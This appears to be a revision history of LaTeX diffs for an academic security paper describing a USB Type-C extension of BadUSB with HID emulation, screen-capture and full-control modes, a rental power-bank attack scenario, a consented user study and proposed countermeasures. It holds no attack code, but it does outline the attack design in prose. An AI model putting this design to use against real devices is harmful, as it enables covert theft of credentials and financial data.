+%the video stream. Don't understand why it is more power-efficient.}
+%\hongyi{Reasonable, changed to other advantage}
+Note that the video capture mode only needs to
+process the victim's video stream locally, it does not need to transmit the real-time video back to the attacker, which is needed when the network connection between \tool and the attacker is not stable.
+%This mode is useful when there is no stable network connection between \tool and the attacker.
 

### 2021-01-30 WOOT/Files/experiment.tex
done with experiments, now I am on the case study.

@@
 
-\subsection{Remote control mode}
-\fengwei{In BadUSB-C section, remote control model is after privacy extraction mode.}
+\subsection{Fully Control Mode}
+%\fengwei{In BadUSB-C section, remote control model is after privacy extraction mode.}
 
-To test the capability of remote control mode, we chose \textit{iPad Pro (3rd
-	generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target
+To test the capability of the fully control mode, we chose iPad Pro (3rd
+	generation), a tablet in iOS 14.3 with a USB Type-C interface, as the target
 device in this experiment.  Besides disguising as normal HID devices like a
@@
 stream from the target device to the attacker via WiFi.  After the connection
-establishment, the attacker performed a series actions to test the capability of
-\tool. In the beginning, the attacker accessed album application on the iPad and
+establishment, the attacker performed a series of actions to test the capability of
+\tool. In the beginning, the attacker accessed the album application on the iPad and
 obtained all the photos inside. After that, the attacker sent messages via victim's
@@
 emulation, \tool extensively expanded the attack capability of BadUSB,
-especially in mobile devices. We have archived the complete hijack of the victim's
+especially in mobile devices. In short, we have archived the complete hijack of the victim's
 device in this experiment.

### 2021-01-30 WOOT/Files/experiment.tex
done with case study backgound .

@@
 \label{subsec:case_study}
+
 \subsubsection{Background}
@@
 rental of power banks.  The company deploys power bank stations in the city and
-users can rent a power bank from any of the power bank station, charge their
-device on the trip, return the rented power bank to the near station, and pay
+users can rent a power bank from any of the power bank stations, charge their
+device on the trip, return the rented power bank to the near stations, and pay
 the rental fee.
@@
 provider from Sweden. It provides power bank rental service all over Sweden
-and is planning on expanding its service around Europe. Moreover, this
+and part of the Europe. Moreover, this
 service is even more popular in Asia, power bank stations are deployed in
@@
 %This suggests that this service is becoming more and more common around the global, especially in Asia and Europe.
-\shuqing{I think we should paraphrase instead of using the descriptions on the website directly. Just to explain \textbf{what we need}.}
+%\shuqing{I think we should paraphrase instead of using the descriptions on the website directly. Just to explain \textbf{what we need}.}
 
-\fengwei{Explain the figure in the text.}
+%\fengwei{Explain the figure in the text.}
+
 \begin{figure}[t]
@@
 	\includegraphics[width=.45 \linewidth, height=.45 \linewidth]{./Figs/PBS_xd.png}
-	\caption{Two Power Bank Stations}
+	\caption{Two Power Bank Stations.}
 	\label{fig:PBS_products}
@@
 
-\yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
+%\yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
 
@@
 By presenting this QR code, the client authorizes the proceeding transaction.
-\ding{184} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the merchant and the client.
+\ding{184} After confirmation, the payment service provider proceeds with this transaction and returns the payment result to both the merchant and the client.
 \shuqing{I think this paragraph can be shorter. No need to explain so many details.}
@@
 
-In the real-world scenario, some payment service providers use special rules
-for micropayment purchases.  A micropayment is pre-determined by the payment
-service provider with thresholds in the user agreement.  For example, WeChat
+Next, we explain one type of payments called micropayment. A micropayment is pre-determined by the payment
+service provider with thresholds in the user agreement. In real-world scenarios, payment service providers use different rules
+for micropayment purchases. For example, WeChat
 Pay~\cite{Wechat-pay} regards transaction under USD \textdollar 154 as
@@
 victim's payment code is leaked to the attackers, they can use that code to
-authorize multiple micropayments without permission.  In order to prevent such
-cases, both WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay} has designed a refreshing mechanism for the
+authorize multiple micropayments without needing permission.  In order to prevent such
+cases, both WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay} have designed a refreshing mechanism for the
 payment code, which is to refresh the QR code every minute. This is sufficient

### 2021-01-30 WOOT/Files/experiment.tex
done with attack scenario in experiment section

@@
 	\item After the modification, an attacker-crafted power bank is returned to a rental station in a crowded area like an airport or railway station, which increases the probability of success.
-	\item a user borrows the modified power bank and connects it to her own device, becoming the victim of \tool.
+	\item A user borrows the modified power bank and connects it to her own device, becoming the victim of \tool.
 	\item The attacker now has complete control over the victim and can perform various attacks using different modes.
@@
 
-Here we summarize the possible threats toward user under different modes. \hongyi{Better way to express this?}
-First, under scripting mode, the attacker is able to implant malware and backdoor script into victims' devices.
-Moreover, using privacy extraction mode, once the victims access their private data like QR payment  code or album, their private data will be immediately transmitted via \tool to the attacker.
-Lastly, with remote control mode, the attacker has complete control over the victims' device and can do anything they want.
+Next, we summarize the possible threats toward user under different modes. 
+\hongyi{Better way to express this?}
+First, under HID emulator mode, the attacker is able to implant malware and backdoor script into victims' devices.
+Moreover, using video capture mode, once the victims access their sensitive data like QR payment  code or album, their sensitive data will be immediately transmitted via \tool to the attacker.
+Lastly, with fully control mode, the attacker has complete control over the victims' device and can conduct any action on the victim device.
 
 \shuqing{Background is longer than real user study.}
-As the functionality and effectiveness of the scripting mode and the remote control mode are rather clear, the former works similar to the original BadUSB, the latter hijacks the victim's device completely.\hongyi{I dont know if it's a good enough reason}
-Here we only validate the usability of privacy extraction mode and conducted a user study.
-We invited 10 volunteers to participate, who are unconscious of \tool details.
-Before the experiment, we disclose to the volunteers how their data might be used and request permission from both the volunteers and the institutional ethics review boards.
-During the experiment, volunteers took turns to use their phones for half an hour with \tool connected, which are considered as a normal power bank.
-To obtain data close to real life, they are requested to use phones just like when they use the shared power bank outside.
-After the experiment, we introduced to them our attack, analyze the screen recordings together to make sure their personal data is not at risk.
+%As the functionality and effectiveness, HID emulator mode is similar to the original BadUSB and the fully control mode hijacks the victim's device completely.
+\hongyi{I dont know if it's a good enough reason}
+%Here we only validate the usability of privacy extraction mode and conducted a user study.
+
+To further validate our attacking scenario, we invited 10 volunteers, who are students in our university, to participate and conduct a user study.
+Before the user study experiment, we disclose to the volunteers how their data might be used and request permission from the volunteers and the university ethics review boards.
+During the case study, volunteers took turns to use their phones for half an hour with \tool connected, which are considered as a normal power bank.
+To obtain data close to real-life, they are requested to use phones like when they use the normal shared power banks.
+After the case study experiment, we introduced to them our attack, analyze the screen recordings together to make sure their personal data is not at risk.
 \shuqing{Do we need to mention that agreement the conference required here?}

### 2021-01-30 WOOT/Files/experiment.tex
edits.

@@
 \subsubsection{Result}
-After collecting the videos, we analyzed the video both automatically and manually.
-During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded video and stored all of the OCR results in a database.
-At last, there are 94058 pieces of data collected among 10 volunteers.
+
+After collecting the captured videos of the mobile phone, we analyzed the videos both automatically and manually.
+During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded videos and stored all of the OCR results in a database.
+In total, there are $94,058$ entries of data collected among 10 volunteers.
 \shuqing{The data may need to be updated.}
-With these results, we could learn what content the victim was browsing.
-Additionally, some keywords such as \textit{account, username, and password} often appear with users' input data because they are often used as labels of input boxes.
+With these results, we could learn what content the victim visited.
+\fengwei{The following text needs to be revised. It is quite difficult for me to understand. Note that this is important text because reviewers are curious about the result. }
+Additionally, keywords such as \textit{account, username, and password} often appear with users' input data because they are often used as labels of input boxes.
 Such keywords are more likely to lead us to user-specific data.
@@
 		\hline
-		Keyword  & Text                                                                                                                          & Name                           & Frame Number \\ \hline
+		\textbf{Keyword}  & \textbf{Text}                                                                                                                          & \textbf{Name}                           & \textbf{Frame Number} \\ \hline
 		username & X 8B cas.******.edu.cn Username: 11****18 Password:                                                                           & \textless{}user1\textgreater{} & 385          \\ \hline
@@
 	\linebreak
-	\caption{Example of searching OCR results with some keywords}
+	\caption{Examples of Searching OCR Results with Keywords.}
 	\label{tab:ocr_keyword_example}
@@
 
-In the manual analysis, we replayed the recorded video and extracted sensitive information.
+In the manual analysis, we replayed the videos and extracted sensitive information.
 The data we collected are listed in Table~\ref{table:information_extracted}.
@@
 	\linebreak
-	\caption{Information extracted}\shuqing{Compress.}
+	\caption{Information Extraction.}\shuqing{Compress.}
 	\label{table:information_extracted}

### 2021-01-30 WOOT/Files/experiment.tex
Done with Experiments Section

@@
 The data we collected are listed in Table~\ref{table:information_extracted}.
-Accounts of internet applications such as Apple, iCloud, Facebook, Twitter, etc. can be obtained.
-Moreover, all of the typing inputs on the virtual keyboard, including the system keyboard and the built-in security keyboard of the financial applications, can be clearly recorded.
+Accounts of internet applications such as Apple, iCloud, Facebook, Twitter can be obtained.
+Moreover, all of the typing inputs on the virtual keyboard, including the system keyboard and the built-in security keyboards of the financial applications, can be clearly recorded.
 We can obtain the plain text of passwords such as WiFi passwords.
@@
 
-In summary, though we can't directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract private information including but not limited to social accounts, bank accounts, personal financial situation, etc., if the user unconsciously unlocks the screen.
-It is worth mentioning that, those \textit{secure keyboards} built in some financial apps just disrupt keyboard sequences, they can't prevent attacks similar as \tool.
+In summary, though we cannot directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal financial situation, etc., if the user unconsciously unlocks the screen.
+It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
 
@@
 		\hline
-		Application Column  & Application & Private information leaked                       \\
+		\textbf{Application Column}  & \textbf{Application} & \textbf{Sensitive information leaked}                      \\
 		\hline
@@
 	\linebreak
-	\caption{Information Extraction.}\shuqing{Compress.}
+	\caption{Information Extraction via Manual Analysis.}\shuqing{Compress.}
 	\label{table:information_extracted}

### 2021-01-30 WOOT/Files/background.tex
update background table

@@
 \begin{table*}
-\begin{tabular}{clccc}
+\begin{tabular}{|c|l|c|c|c|}
 	\hline
@@
 	1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating(BadUSB)~\cite{badusb} \\
+	\hline
 	2000 & USB 2.0~\cite{usb20} & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack~\cite{duqu}, Juice Filming~\cite{JFC,JFCImpact} \\
+	\hline
 	2008 & USB 3.0~\cite{usb30} & / & 5 Gbit/s & / \\
+	\hline
 	2013 & USB 3.1~\cite{usb31} & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
+	\hline
 	2017 & USB 3.2~\cite{usb32} & / & 20 Gbit/s & / \\

### 2021-01-30 WOOT/Files/experiment.tex

@@
 \begin{figure}[t]
-	\includegraphics[width=.98\linewidth]{./Figs/armory_all.png}\\
+	\includegraphics[width=\linewidth]{./Figs/armory_all.png}\\
 	\begin{tabular}{ll}
@@
 
-For example, Brick~\cite{Brick} is such a power bank sharing service
-provider from Sweden. It provides power bank rental service all over Sweden
-and part of the Europe. Moreover, this
-service is even more popular in Asia, power bank stations are deployed in
-markets, stores, and even newsstands.
-%This suggests that this service is becoming more and more common around the global, especially in Asia and Europe.
-%\shuqing{I think we should paraphrase instead of using the descriptions on the website directly. Just to explain \textbf{what we need}.}
-
-%\fengwei{Explain the figure in the text.}
-
+Power bank sharing is a popular service in Asia, power bank stations are deployed
+in markets, stores, and even newsstands. For example, as shown in Figure~\ref{fig:PBS_products},
+ there are two power banks station products from China, which are operated by Meituan and Xiaodian respectively. Brick~\cite{Brick} is such a power bank sharing service provider from
+  Sweden. It provides power bank rental service all over Sweden and is planning on expanding its
+   service around Europe.
 \begin{figure}[t]
@@
 
-%\yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
-
-\yechang{Add more examples of power bank sharing to show that it is widely used?}
 \shuqing{May use statistics (instead of concrete examples) to explain it.}

### 2021-01-30 WOOT/Files/background.tex
removal of used comment

--- 2021-01-30 WOOT/Files/background.tex
@@
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF.\fengwei{Add a citation for USB-IF} As it is designed to be double-sided, the number of actually usable
+standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF~\cite{usbif}. As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability

### 2021-01-30 WOOT/Files/experiment.tex
removal of used comment

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 %2, 3, 4, and 5?}\hongyi{Is the caption sufficient? If explain here, I feel quite redundant}
-\fengwei{I think it is necessary to explain them in the text again.}
+%\fengwei{I think it is necessary to explain them in the text again.}
 
@@
 
+%\fengwei{do we need a reference for OCR?}
+%\hongyi{we have discussed this and decide no need.}
 \subsection{Video Capture Mode}
@@
 information from the video stream.  When the victim viewed text or photos with
-text, \tool used the techniques of Optical Character Recognition (OCR) \fengwei{do we need a reference for OCR?} to
+text, \tool used the techniques of Optical Character Recognition (OCR)  to
 extract text from corresponding video frames. In this experiment, the attacker had

### 2021-01-30 WOOT/Files/badusb.tex

@@
 
-	\item\underline{Video Capture Card} converts DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by the Single Board Computer (i.e., an embedded computer).
+	\item\underline{Video Capture Card} converts DisplayPort signal into compatible data, which is later processed by the Single Board Computer (i.e., an embedded computer).
 
@@
 	\begin{tabular}{ll}
-	\mycircled{1} Victim's Devices    &\mycircled{2}\tool\\
-	\mycircled{3} Attacker's Remote PC
+	\circled[text=white,fill=myyellow]{\footnotesize{1}} Victim's Devices    &\circled[text=white,fill=myyellow]{\footnotesize{2}}~\tool\\
+	\circled[text=white,fill=myyellow]{\footnotesize{3}} Attacker's Remote PC
 	\end{tabular}

### 2021-01-30 WOOT/Files/experiment.tex
revision of PBS description

@@
 Power bank sharing is a popular service in Asia, power bank stations are deployed
-in markets, stores, and even newsstands. For example, as shown in Figure~\ref{fig:PBS_products},
- there are two power banks station products from China, which are operated by Meituan and Xiaodian respectively. Brick~\cite{Brick} is such a power bank sharing service provider from
+in markets, stores, and even newsstands. For example, Figure~\ref{fig:PBS_products} are photos
+of two power bank stations in China, which are taken outside of a supermarket. Brick~\cite{Brick} is also a power bank sharing service provider from
 Sweden. It provides power bank rental service all over Sweden and is planning on expanding its
-   service around Europe.
+service to entire Europe.
 \begin{figure}[t]

### 2021-01-30 WOOT/Files/countermeasure.tex
small but important typo fix
done with countermesaure

@@
 Authorization mechanisms like GoodUSB~\cite{tian2015defending} have been
-proposed as countermeasures against the BadUSB attack. As mentioned in
+proposed as countermeasures against BadUSB attacks. As mentioned in
 Section~\ref{sec:badusb} and Section~\ref{sec:experiment}, GoodUSB relies on
@@
 %no defense at all for our \tool. 
-Next, we discuss some effective countermeasures against \tool.
+Next, we discuss our recommended countermeasures against \tool.
 
@@
 is worth mentioning that \textit{distrust-by-default} policy is not the same as
-GoodUSB~\cite{tian2015defending}.  \fengwei{the following sentence needs to be
-written.
-I am confused.}\hongyi{Fixed, use more concise sentences} GoodUSB permits limited functionality of untrusted devices while this strict policy forbids all functions of an untrusted device.
-Though \textit{distrust-by-default} policy effectively
+GoodUSB~\cite{tian2015defending}.  
+%\fengwei{the following sentence needs to be
+%written. I am confused.}\hongyi{Fixed, use more concise sentences} 
+GoodUSB permits limited functionality of untrusted devices while this strict policy forbids all functions of an untrusted device. Though \textit{distrust-by-default} policy effectively
 prevents these attacks, it also causes considerable inconvenience for users.
@@
 called \emph{Isolated UI Rendering}. As illustrated in
-Figure~\ref{fig:isolated_ui}, we designed two separated UI render layer and corresponding driver, one
-is secure the other is insecure. When an application require to render, it can
+Figure~\ref{fig:isolated_ui}, we designed two separated UI render layers and corresponding drivers, one
+is secure the other is insecure. When an application requires to render, it can
 pass the content along with a tag identifying whether the content is
@@
 (e.g., a keyboard) on the trusted screen. For the rest of the rendering, it
-would render on both trusted and untrusted display (e.g., insensitive
+would render on both the trusted and untrusted display (e.g., insensitive
 contents).
 For example, in Figure~\ref{fig:isolated_ui}, the `password' and `keyboard' are recognized as sensitive while other parts of content are in sensitive.
-Thus, the `password' and `keyboard' are not rendered on untrusted screen as they contains private information.
+Thus, the `password' and `keyboard' are not rendered on untrusted screen.
  \fengwei{we need more text to describe the figure}.
@@
 \end{figure}
-\fengwei{what are untrusted and trusted screens? are they internal and external displays?}
-\hongyi{Fixed by using the same term and additional description}
+%\fengwei{what are untrusted and trusted screens? are they internal and external displays?}
+%\hongyi{Fixed by using the same term and additional description}

### 2021-01-30 WOOT/Files/experiment.tex
revision of PBS description
[experiment] table

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 %2, 3, 4, and 5?}\hongyi{Is the caption sufficient? If explain here, I feel quite redundant}
-%\fengwei{I think it is necessary to explain them in the text again.}
+\fengwei{I think it is necessary to explain them in the text again.}
 
@@
 
-%\fengwei{do we need a reference for OCR?}
-%\hongyi{we have discussed this and decide no need.}
 \subsection{Video Capture Mode}
@@
 information from the video stream.  When the victim viewed text or photos with
-text, \tool used the techniques of Optical Character Recognition (OCR)  to
+text, \tool used the techniques of Optical Character Recognition (OCR) \fengwei{do we need a reference for OCR?} to
 extract text from corresponding video frames. In this experiment, the attacker had
@@
 		\hline
-		\textbf{Keyword}  & \textbf{Text}                                                                                                                          & \textbf{Name}                           & \textbf{Frame Number} \\ \hline
+		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbackslash{}textbf\{Frame Number\} \\ \hline
 		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline
-		username & Login Weibo Login with SMS and verification code ...... +86 151****4587 & \textless{}user5\textgreater{} & 1947         \\ \hline
+		username                          & Login Weibo Login with SMS and verification code ......
++86 151****4587                    & \textless{}user5\textgreater{} & 1947                                   \\ \hline
 		username                          & QQ 14*****50| Login with phone number New user registration 2345678 9 0                    & \textless{}user3\textgreater{} & 4308                                   \\ \hline
-		username & connect to *** username h*****l Save account information Open VPN.....                                                        & \textless{}user6\textgreater{} & 7925         \\ \hline
-		+86      & Login with phone number ...... +86 186****2483 |                                                                              & \textless{}user1\textgreater{} & 313          \\ \hline
+		username                          & connect to *** username h*****l Save account information Open VPN.....
+& \textless{}user6\textgreater{} & 7925                                   \\ \hline
+		phone number                      & Login with phone number ......
++86 186****2483 |                                           & \textless{}user1\textgreater{} & 313                                    \\ \hline
+		phone number                      & Log in with your mobile phone number. ...... mobile phone number 131****9310 & \textless{}user9\textgreater{} & 210                                    \\ \hline
+		@                                 & contact email 30*******7G@qq.com, contact phone 027-88******                               & \textless{}user7\textgreater{} & 5324                                   \\ \hline
+		@                                 & Account 73*****5@qq.com @qq.com @163.com @gmail.com 	......      & \textless{}user6\textgreater{} & 621                                    \\ \hline
 	\end{tabular}

### 2021-01-30 WOOT/Files/experiment.tex

@@
 Power bank sharing is a popular service in Asia, power bank stations are deployed
-in markets, stores, and even newsstands. For example, as shown in Figure~\ref{fig:PBS_products},
- there are two power banks station products from China, which are operated by Meituan and Xiaodian respectively. Brick~\cite{Brick} is such a power bank sharing service provider from
+in markets, stores, and even newsstands. For example, Figure~\ref{fig:PBS_products} are photos
+of two power bank stations in China, which are taken outside of a supermarket. Brick~\cite{Brick} is also such a power bank sharing service provider from
 Sweden. It provides power bank rental service all over Sweden and is planning on expanding its
-   service around Europe.
+service to entire Europe.
 \begin{figure}[t]

### 2021-01-30 WOOT/BadUSBC.tex
Update abs

@@
 To our best knowledge, \tool is the first attack model utilizing USB Type-C.
-To validate the usability and effectiveness, we conducted extensive experiments and a user study, in which 
-\fengwei{What results?}we got valuable results.
+To validate the usability and effectiveness, we conducted extensive experiments and a user study on a real-life attack scenario.
+10 volunteers are involved in, and 4,796 of 94,058 records obtained by \tool in the user study are related to privacy information.
+\fengwei{What results?}
 %\fengwei{what countermeasures do we propose? including isolated UI rendering.}

### 2021-01-30 WOOT/Files/background.tex

--- 2021-01-30 WOOT/Files/background.tex
@@
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF~\cite{usbif}.\fengwei{Add a citation for USB-IF} As it is designed to be double-sided, the number of actually usable
+standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF~\cite{usbif}. As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability

### 2021-01-30 WOOT/Files/conclusion.tex

@@
 new attack scheme named \tool and three attack modes. Each of these three modes
-has its own strength and use scenarios. The scripting mode largely extends the
-original BadUSB and successfully bypasses existing defenses. The privacy
-extraction mode proved practical and powerful in the user study, as it extracts
-victim's sensitive information in a stealthy way. The remote control mode
+has its own strength and use scenarios. The HID Emulation mode largely extends the
+original BadUSB and successfully bypasses existing defenses. The video capture mode proved practical and powerful in the user study, as it extracts
+victim's sensitive information in a stealthy way. The full control mode
 archives the complete hijack of the target device, allowing us to perform various
@@
 it more practical.
+
+\section{Responsive Disclosure}
+
+Responsive disclosure have already been carried out, we have already contacted the affected vendors through proper channel and are waiting for mitigation being deployed.

### 2021-01-30 WOOT/Files/conclusion.tex
conclusions

@@
 
-Leveraging the new features of USB 3.x~\cite{usb31,usb31,usb32}, we explore a
+Leveraging the new features of USB 3.x~\cite{usb30,usb31,usb32}, we explore a
 new attack scheme named \tool and three attack modes. Each of these three modes
-has its own strength and use scenarios. The HID Emulation mode largely extends the
+has its own strength and use scenarios. The HID emulator mode largely extends the
 original BadUSB and successfully bypasses existing defenses. The video capture mode proved practical and powerful in the user study, as it extracts
-victim's sensitive information in a stealthy way. The full control mode
+victim's sensitive information in a stealthy way. The fully control mode
 archives the complete hijack of the target device, allowing us to perform various
 types of subsequent attacks. By experimenting \tool with mobile phones, tablets,
-and PCs, we further test its ability under different mode and proves it can
+and PCs, we further test its ability under different modes and shows it can
 bypass defenses such as GoodUSB~\cite{tian2015defending}. In our user study, we

### 2021-01-30 WOOT/Files/badusb.tex

@@
 
-\textbf{Scripting Mode.} This mode majorly relies on the ``HID Emulator'' in the Figure~\ref{fig:attack_model} to
+\textbf{HID Emulation Mode.} This mode majorly relies on the ``HID Emulator'' in the Figure~\ref{fig:attack_model} to
 send constructed HID packet to the victim. These constructed HID packets are
@@
 
-\textbf{Privacy Extraction Mode.} \tool under this mode does not emulate other
+\textbf{Video Capture Mode.} \tool under this mode does not emulate other
 USB device and solely relies on the video stream function of USB 3.x; it uses
@@
 
-\textbf{Remote Control Mode.} In \tool, we have implemented all components
-required to control a computer/mobile device remotely, including a video stream
+\textbf{Full Control Mode.} In \tool, we have implemented all components
+required to control a computer/mobile device completely, including a video stream
 and a keyboard/mouse emulation. Thus with all components enabled, not only

### 2021-01-30 WOOT/Files/conclusion.tex
resolve conflict

@@
 new attack scheme named \tool and three attack modes. Each of these three modes
-has its own strength and use scenarios. The HID emulator mode largely extends the
+has its own strength and use scenarios. The HID Emulation mode largely extends the
 original BadUSB and successfully bypasses existing defenses. The video capture mode proved practical and powerful in the user study, as it extracts
-victim's sensitive information in a stealthy way. The fully control mode
+victim's sensitive information in a stealthy way. The full control mode
 archives the complete hijack of the target device, allowing us to perform various

### 2021-01-30 WOOT/Files/experiment.tex
fix a typo

@@
 		\hline
-		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbackslash{}textbf\{Frame Number\} \\ \hline
+		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbf{Frame Number} \\ \hline
 		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline

### 2021-01-30 WOOT/Files/related_work.tex
nits

@@
 \label{subsec:usb_attack}
-\chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
 %\fengwei{Related work section needs to be improved. Many typos and grammar mistakes can be found.}
@@
 corruption, and code injection. This has paved the path for our \tool.
-
-\chaozu{attack table}\\
-\chaozu{enum diagram}
 
@@
 			Windows Defender ATP~\cite{windenfenderwhite}, \\
-			Mohammadmoradi et al.~\cite{mohammadmoradi2018making}, \\
+			Mohammadmoradi \emph{et al.}~\cite{mohammadmoradi2018making}, \\
 			TMSUI~\cite{yang2015tmsui}
@@
 
-		\makecell{Neuner et al.~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty\\
+		\makecell{Neuner \emph{et al.}~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty\\
 		\hline
-		\makecell{Pham et al.~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty\\
+		\makecell{Pham \emph{et al.}~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty\\
 		\hline

### 2021-01-30 WOOT/Files/experiment.tex
nits

@@
 		\hline
-		\textbf{Application Column}  & \textbf{Application} & \textbf{Sensitive information leaked}                      \\
+		\textbf{Category}  & \textbf{Application} & \textbf{Leaked Sensitive Information}                      \\
 		\hline
-		Finance App         & Alipay      & Alipay account, personal assets(blance)          \\
+		Finance App         & Alipay      & Alipay account, personal assets (blance)          \\
 		\hline
-		Social  Finance App & WeChat      & WeChat account, blance, chat history             \\
+		Social  Finance App & WeChat      & WeChat account, , chat history             \\
 		\hline
@@
 		\hline
-		Finance App         & ICBC        & ICBC account, password, personal assets(blance)  \\
+		Finance App         & ICBC        & ICBC account, password, personal assets (balance)  \\
 		\hline
-		Finance App         & Paypal      & Paypal account, blance, bank accounts            \\
+		Finance App         & Paypal      & Paypal account, balance, bank accounts            \\
 		\hline

### 2021-01-30 WOOT/Files/experiment.tex
Update introduction

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 The image of our \tool prototype can be found in Figure~\ref{fig:armory}.
-\mycircled{A} is a Huawei mobile phone as the victim's device; \mycircled{B} is a compact look of \tool prototype; \mycircled{1} is the USB 3.x Hub; \mycircled{2} is a Raspberry Pi 4B as the Single Board Computer; \mycircled{3} is an auxiliary power bank; \mycircled{4} is the Video Capture Card; \mycircled{5} is an Atmel ATMEGA32U4 board as the HID Emulator.
+\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\footnotesize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\footnotesize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\footnotesize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\footnotesize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\footnotesize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,

### 2021-01-30 WOOT/Files/experiment.tex
fully2full

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 
-To test the capability of the fully control mode, we chose iPad Pro (3rd
+To test the capability of the full control mode, we chose iPad Pro (3rd
 	generation), a tablet in iOS 14.3 with a USB Type-C interface, as the target
@@
 Moreover, using video capture mode, once the victims access their sensitive data like QR payment  code or album, their sensitive data will be immediately transmitted via \tool to the attacker.
-Lastly, with fully control mode, the attacker has complete control over the victims' device and can conduct any action on the victim device.
+Lastly, with full control mode, the attacker has complete control over the victims' device and can conduct any action on the victim device.
 
 \shuqing{Background is longer than real user study.}
-%As the functionality and effectiveness, HID emulator mode is similar to the original BadUSB and the fully control mode hijacks the victim's device completely.
+%As the functionality and effectiveness, HID emulator mode is similar to the original BadUSB and the full control mode hijacks the victim's device completely.
 \hongyi{I dont know if it's a good enough reason}

### 2021-01-30 WOOT/Files/experiment.tex
Update

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 In total, there are $94,058$ entries of data collected among 10 volunteers.
-\shuqing{The data may need to be updated.}
+%\shuqing{The data may need to be updated.}
 With these results, we could learn what content the victim visited.
-\fengwei{The following text needs to be revised. It is quite difficult for me to understand. Note that this is important text because reviewers are curious about the result. }
+%\fengwei{The following text needs to be revised. It is quite difficult for me to understand. Note that this is important text because reviewers are curious about the result. }
 Additionally, keywords such as \textit{account, username, and password} often appear with users' input data because they are often used as labels of input boxes.
@@
 For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
-\shuqing{Statistics.}
+%\shuqing{Statistics.}
 The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.

### 2021-01-30 WOOT/BadUSBC.tex
nits
Update introduction
pass on abstract

@@
 \begin{abstract}
-The security of USB protocol has been paid extensive attention to, despite its wide usage.
-Due to the \textit{trust-by-default} characteristics, USB security has caused serious problems.
-For example, a well-known firmware attack, BadUSB, performs malicious operations on the victim hosts through disguising normal USB devices as human interface devices like keyboards and mice.
-However, BadUSB suffers from several limitations.
-Attackers cannot obtain the status of user interface to conduct precise attacks, and they may be detected by multiple effective countermeasures.
-In this work, we extended BadUSB to support the new features of USB Type-C and proposed a multi-mode attack model, \tool.
-It can obtain UI status to make attacks more precise and effective, and also bypass existing defense methods for BadUSB.
-To our best knowledge, \tool is the first attack model utilizing USB Type-C.
-To validate the usability and effectiveness, we conducted extensive experiments and a user study on a real-life attack scenario.
-10 volunteers are involved in, and 4,796 of 94,058 records obtained by \tool in the user study are related to privacy information.
-\fengwei{What results?}
-%\fengwei{what countermeasures do we propose? including isolated UI rendering.}
-We also proposed reasonable countermeasures for our attack model, including isolated UI rendering, external hardware authorization and distrust-by-default, which may be inspiring for future research on defense methods.
+
+The security of USB protocol has been paid extensive attention to, despite its
+    wide usage.  Due to the \textit{trust-by-default} characteristics, USB
+    security has caused serious problems.  For example, a well-known firmware
+    attack, BadUSB, performs malicious operations on the victim hosts through
+    disguising normal USB devices as human interface devices like keyboards and
+    mice.  However, BadUSB suffers from several limitations.  Attackers cannot
+    obtain the status of user interface to conduct precise attacks, and they
+    can detected by multiple existing countermeasures.  In this work, we
+    extended BadUSB to support the new features of USB Type-C and proposed a
